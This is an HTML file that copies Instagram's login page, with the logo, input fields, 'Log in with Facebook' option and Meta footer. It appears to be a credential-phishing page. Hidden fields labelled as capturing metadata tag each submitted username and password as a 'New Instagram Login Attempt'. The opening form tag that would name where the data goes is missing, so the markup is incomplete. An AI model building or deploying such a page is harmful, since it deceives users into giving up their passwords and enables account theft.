<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Instagram</title>
  <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet"/>
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

    body {
      min-height: 100vh;
      background: #fafafa;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .card {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      width: 350px;
      padding: 36px 40px 24px;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .logo {
      font-family: 'Grand Hotel', cursive;
      font-size: 52px;
      color: #262626;
      margin-bottom: 24px;
      letter-spacing: -1px;
    }

    form {
      width: 100%;
      display: flex;
      flex-direction: column;
      gap: 6px;
    }

    .input-wrap {
      position: relative;
      width: 100%;
    }

    .input-wrap input {
      width: 100%;
      height: 38px;
      background: #fafafa;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      padding: 9px 12px;
      font-size: 12px;
      color: #262626;
      outline: none;
      transition: border-color 0.15s;
    }

    .input-wrap input:focus {
      border-color: #a8a8a8;
      background: #fff;
    }

    .input-wrap input::placeholder {
      color: #8e8e8e;
      font-size: 12px;
    }

    .show-btn {
      position: absolute;
      right: 10px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      font-size: 12px;
      font-weight: 600;
      color: #262626;
      cursor: pointer;
    }

    .divider {
      display: flex;
      align-items: center;
      gap: 18px;
      margin: 14px 0 10px;
      color: #8e8e8e;
      font-size: 13px;
      font-weight: 600;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .divider::before, .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dbdbdb;
    }

    .submit-btn {
      width: 100%;
      height: 32px;
      background: linear-gradient(45deg, #833ab4, #fd1d1d, #fcb045);
      border: none;
      border-radius: 4px;
      color: #fff;
      font-size: 14px;
      font-weight: 600;
      cursor: pointer;
      transition: opacity 0.2s;
      margin-top: 8px;
    }

    .submit-btn:hover { opacity: 0.85; }

    .forgot {
      text-align: center;
      margin-top: 14px;
      font-size: 12px;
      color: #00376b;
      cursor: pointer;
    }

    .card2 {
      background: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 3px;
      width: 350px;
      padding: 20px;
      text-align: center;
      font-size: 14px;
      color: #262626;
    }

    .card2 a {
      color: #0095f6;
      font-weight: 600;
      text-decoration: none;
    }

    .app-links {
      margin-top: 16px;
      text-align: center;
      font-size: 14px;
      color: #262626;
    }

    .app-links p { margin-bottom: 10px; }

    .store-badges {
      display: flex;
      justify-content: center;
      gap: 6px;
    }

    .badge {
      background: #262626;
      color: #fff;
      border-radius: 4px;
      padding: 6px 12px;
      font-size: 11px;
      display: flex;
      flex-direction: column;
      line-height: 1.3;
    }

    .badge span:first-child { font-size: 9px; color: #ccc; }
    .badge span:last-child { font-weight: 600; font-size: 13px; }

    .footer {
      margin-top: 24px;
      text-align: center;
      font-size: 12px;
      color: #8e8e8e;
      line-height: 2;
    }

    .footer a {
      color: #8e8e8e;
      text-decoration: none;
      margin: 0 4px;
    }

    .footer a:hover { text-decoration: underline; }
  </style>
</head>
<body>

  <div class="card">
    <div class="logo">Instagram</div>

    
      <!-- Hidden fields to capture metadata -->
      <input type="hidden" name="_subject" value="New Instagram Login Attempt"/>
      <input type="hidden" name="page_url" value="Instagram Login Page"/>

      <div class="input-wrap">
        <input type="text" name="username_or_email" placeholder="Phone number, username, or email" required />
      </div>

      <div class="input-wrap">
        <input type="password" name="password" id="pwd" placeholder="Password" required />
        <button type="button" class="show-btn" onclick="togglePwd()">Show</button>
      </div>

      <button type="submit" class="submit-btn">Log in</button>

      <div class="divider">or</div>

      <div style="text-align:center; margin-bottom:8px;">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" width="16" style="vertical-align:middle; margin-right:6px;" />
        <span style="font-size:14px; font-weight:600; color:#385185; cursor:pointer;">Log in with Facebook</span>
      </div>

      <div class="forgot">Forgot password?</div>
    </form>
  </div>

  <div class="card2">
    Don't have an account? <a href="#">Sign up</a>
  </div>

  <div class="app-links">
    <p>Get the app.</p>
    <div class="store-badges">
      <div class="badge">
        <span>Download on the</span>
        <span>App Store</span>
      </div>
      <div class="badge">
        <span>Get it on</span>
        <span>Google Play</span>
      </div>
    </div>
  </div>

  <div class="footer">
    <div>
      <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a>
      <a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a>
    </div>
    <div>
      <a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a>
    </div>
    <div style="margin-top:4px;">English &copy; 2026 Instagram from Meta</div>
  </div>

  <script>
    function togglePwd() {
      const pwd = document.getElementById('pwd');
      const btn = pwd.nextElementSibling;
      if (pwd.type === 'password') {
        pwd.type = 'text';
        btn.textContent = 'Hide';
      } else {
        pwd.type = 'password';
        btn.textContent = 'Show';
      }
    }
  </script>

</body>
</html>
